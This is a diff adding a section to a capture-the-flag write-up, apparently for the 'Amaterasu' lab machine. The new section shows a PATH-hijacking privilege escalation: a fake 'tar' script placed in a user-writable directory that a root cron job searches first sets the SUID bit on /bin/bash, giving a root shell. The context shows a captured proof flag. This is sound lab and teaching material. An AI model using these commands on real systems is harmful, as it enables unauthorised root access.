@@ -175,3 +175,27 @@ bash-5.1# cd /root
 bash-5.1# cat proof.txt
 c7ca02b48f4a06b2fae8113a88bf30e5
 ```
+
+### Alternative Privilege Escalation — PATH hijacking
+
+PATH hijacking exploits the same cron job (`/usr/local/bin/backup-flask.sh`) by leveraging the PATH export that prepends `/home/alfredo/restapi` before running `tar`. By placing a malicious executable named `tar` in `/home/alfredo/restapi/`, the cron job executes the malicious version instead of `/bin/tar`, achieving root-level privilege escalation.
+
+Create a malicious `tar` binary that sets the SUID bit on `/bin/bash`:
+
+```
+[alfredo@fedora restapi]$ cat > tar << 'EOF'
+#!/bin/sh
+chmod +s /bin/bash
+EOF
+[alfredo@fedora restapi]$ chmod +x tar
+```
+
+Wait for the next cron execution (runs every minute), then spawn a root shell:
+
+```
+[alfredo@fedora restapi]$ /bin/bash -p
+bash-5.1# whoami
+root
+```
+
+Credit: [HackIndex — Amaterasu Writeup](https://hackindex.io/writeups/amaterasu)
